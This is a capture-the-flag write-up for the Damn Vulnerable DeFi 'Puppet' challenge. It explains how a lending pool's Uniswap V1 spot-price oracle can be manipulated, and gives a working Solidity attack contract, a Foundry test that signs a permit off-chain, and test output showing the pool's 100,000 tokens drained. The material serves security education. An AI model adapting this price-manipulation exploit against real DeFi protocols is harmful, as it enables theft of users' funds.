# Challenge - Puppet

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

## Objective of CTF

Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.

## Vulnerability Analysis

### Root Cause: Price Manipulation

The lending pool allows anyone to borrow the DVT tokens. The amount that can be borrowed is determined by the amount of collateral (e.g. ETH) deposited:

```solidity
function borrow(uint256 amount, address recipient) external payable nonReentrant {
    uint256 depositRequired = calculateDepositRequired(amount);

    if (msg.value < depositRequired) {
        revert NotEnoughCollateral();
    }

    if (msg.value > depositRequired) {
        unchecked {
            payable(msg.sender).sendValue(msg.value - depositRequired);
        }
    }

    unchecked {
        deposits[msg.sender] += depositRequired;
    }

    // Fails if the pool doesn't have enough tokens in liquidity
    if (!token.transfer(recipient, amount)) {
        revert TransferFailed();
    }

    emit Borrowed(msg.sender, recipient, depositRequired, amount);
}
```

The key to the exploit lies in the `calculateDepositRequired()` function, which determines how much ETH must be deposited to borrow the DVT tokens. The required collateral amount is based on the ETH and the DVT token balance of the `uniswapPair`. However, these balances can be easily manipulated through token swaps:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}
```

From the `_computeOraclePrice` formula, it’s clear that lowering the oracle price requires reducing the ETH balance and increasing the DVT balance in the uniswapPair. We can achieve this by calling the `tokenToEthTransferOutput()` function in the `UniswapV1Exchange` contract, allowing us to swap ETH for DVT tokens and manipulate the price.

```solidity
function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

### Attack steps:

1. Sign an off-chain approval to allow the attack contract to transfer the player's DVT tokens during the attack. This eliminates the need for an additional on-chain approval transaction, which is crucial since the challenge limits the player to a single transaction.
1. Swap out most of the ETH for DVT tokens in the Uniswap V1 pair to significantly lower the DVT token price.
1. Borrow all the DVT token from the lending pool.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external;
}

interface IPuppetPool {
    function borrow(uint256 amount, address recipient) external payable;
}

contract AttackPuppet {
    address private immutable uniswapPair;
    address private immutable pool;
    address private immutable token;

    constructor(
        address _uniswapPair,
        address _pool,
        address _token,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address _recovery
    ) payable {
        uniswapPair = _uniswapPair;
        pool = _pool;
        token = _token;

        IERC20(token).permit(msg.sender, address(this), amount, deadline, v, r, s);
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        IERC20(token).approve(uniswapPair, amount);
        IUniswapV1Exchange(uniswapPair).tokenToEthTransferOutput(9.9 ether, amount, block.timestamp, payable(_recovery));
        IPuppetPool(pool).borrow{value: msg.value}(100000 ether, _recovery);
    }

    receive() external payable {}
}
```

### Test contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
import {AttackPuppet} from "../../src/puppet/AttackPuppet.sol";

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the lendingPool contract", token.balanceOf(address(lendingPool)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );

        address contractAddress = vm.computeCreateAddress(player, 0);
        uint256 nonce = token.nonces(player);
        uint256 deadline = block.timestamp + 1;

        bytes32 permitHash = keccak256(
            abi.encode(
                keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
                player,
                contractAddress,
                1000 ether,
                nonce,
                deadline
            )
        );

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), permitHash));

        // Sign the digest
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);

        new AttackPuppet{value: 20 ether}(
            address(uniswapV1Exchange), address(lendingPool), address(token), 1000 ether, deadline, v, r, s, recovery
        );

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the lendingPool contract", token.balanceOf(address(lendingPool)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
```

### Test Result

```
Ran 2 tests for test/puppet/Puppet.t.sol:PuppetChallenge
[PASS] test_assertInitialState() (gas: 49270)
[PASS] test_puppet() (gas: 298965)
Logs:
  -------------------------- Before exploit --------------------------
  token balance in the lendingPool contract: 100000.000000000000000000
  token balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  token balance in the lendingPool contract: 0.000000000000000000
  token balance in the recovery address: 100000.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 13.27ms (4.52ms CPU time)

Ran 1 test suite in 230.90ms (13.27ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
